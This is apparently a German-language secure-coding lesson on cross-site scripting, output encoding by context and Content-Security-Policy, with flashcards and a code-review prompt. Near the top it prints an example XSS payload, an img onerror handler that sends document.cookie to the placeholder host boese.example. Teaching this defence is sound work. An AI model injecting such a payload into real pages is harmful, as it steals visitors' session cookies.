---
titel: Ausgaben maskieren
kurz: Cross-Site-Scripting, Kontext und die Content-Security-Policy als zweite Linie
dauer: 40 Minuten
projekt: mius.ch, MIus Notes
---
Der vorige Schritt hat Daten auf dem Weg in ein System betrachtet. Dieser betrachtet den Weg hinaus: Was jemand eingegeben hat, wird später einer anderen Person im Browser angezeigt.

## Cross-Site-Scripting

Eine Notiz-App zeigt den Titel einer geteilten Notiz an. Jemand nennt seine Notiz:

```html
<img src=x onerror="fetch('https://boese.example/?c='+document.cookie)">
```

Fügt die Seite den Titel unverändert ins HTML ein, führt der Browser jeder Person, die die Notiz öffnet, dieses Skript aus. Es läuft mit allen Rechten dieser Person auf dieser Seite. Das heisst **Cross-Site-Scripting** (XSS). Es ist Injection in HTML: Daten werden zu Code, diesmal im Browser.

## Maskieren, abhängig vom Kontext

Die Gegenmassnahme heisst **Ausgabe-Kodierung** oder Maskieren: Zeichen, die in HTML eine Bedeutung haben, werden durch ihre neutrale Schreibweise ersetzt. Aus `<` wird `&lt;`, aus `"` wird `&quot;`. Der Browser zeigt dann das Zeichen an, statt es als Markup zu lesen.

Wichtig ist der **Kontext**. Zwischen zwei Tags reichen `& < >`. In einem Attribut braucht es zusätzlich `"` und `'`. In einem `<script>`, in CSS oder in einer URL gelten andere Regeln. Deshalb soll man nicht selbst maskieren, sondern die Funktionen der Vorlagensprache oder des Frameworks nutzen, die den Kontext kennen. React maskiert Text automatisch, PHP hat `htmlspecialchars`, Python `html.escape`. Die Übung unten baust du trotzdem selbst, damit du siehst, was diese Funktionen tun.

Die Reihenfolge ist entscheidend: `&` muss zuerst ersetzt werden. Sonst wird aus `<` zuerst `&lt;` und dann `&amp;lt;`.

## Die zweite Linie: Content-Security-Policy

Maskieren kann man vergessen. Deshalb gibt es eine zweite Verteidigungslinie im Browser: die **Content-Security-Policy** (CSP). Ein HTTP-Header legt fest, woher Skripte kommen dürfen. Mit `script-src 'self'` führt der Browser nur Skripte aus eigenen Dateien aus, keine eingeschleusten `onerror`-Attribute und keine fremden Server. Dieses Prinzip mehrerer unabhängiger Schichten heisst **Defense in Depth**.

## Projektbezug

**mius.ch**: `site/faden.js` hat eine Funktion `esc()`, die genau die fünf Zeichen dieser Übung ersetzt, bevor Text ins Bedienfeld geschrieben wird. **MIus Notes** hat laut `docs/sicherheit.md` eine strenge CSP: «nur eigene Skripte, Stile und Schriften, keine fremden Quellen». Eingebettete Videos laufen in einem `iframe` mit `sandbox`. Und die Lernwerkstatt selbst lädt Python aus dem eigenen Server statt von einem fremden Netzwerk, damit ihre CSP streng bleiben kann.

## Karten

F: Was ist Cross-Site-Scripting?
A: Eingeschleuster Code, der im Browser einer anderen Person mit deren Rechten auf der Seite läuft. Injection in HTML.

F: Welche fünf Zeichen maskiert man für HTML-Text und Attribute?
A: `&` `<` `>` `"` `'`, und `&` zuerst.

F: Warum soll man Maskieren nicht selbst programmieren?
A: Je nach Kontext (Text, Attribut, Skript, URL, CSS) gelten andere Regeln. Vorlagensprachen und Frameworks kennen den Kontext.

F: Was leistet eine Content-Security-Policy?
A: Sie legt fest, woher der Browser Skripte und andere Inhalte laden darf. Eingeschleuste Skripte laufen dann nicht, auch wenn das Maskieren versagt.

F: Was heisst Defense in Depth?
A: Mehrere unabhängige Schutzschichten, damit das Versagen einer einzelnen nicht reicht.

## Prompt

```
Finde alle Stellen, an denen Daten von Nutzerinnen oder aus der Datenbank
in HTML, Attribute, URLs oder Skripte geschrieben werden (innerHTML,
dangerouslySetInnerHTML, echo, Vorlagen ohne Maskierung). Nenne für jede den
Kontext und ob korrekt maskiert wird. Prüfe dann die Content-Security-Policy:
Welche Quellen sind erlaubt, gibt es 'unsafe-inline' oder 'unsafe-eval'?
```

## Literatur

- OWASP: Cross Site Scripting Prevention Cheat Sheet. cheatsheetseries.owasp.org
- OWASP (2021). *OWASP Top 10:2021*, A03 Injection (XSS ist dort eingeordnet).
- W3C (2023). *Content Security Policy Level 3*, Working Draft. w3.org/TR/CSP3
- Python-Dokumentation: `html.escape`.
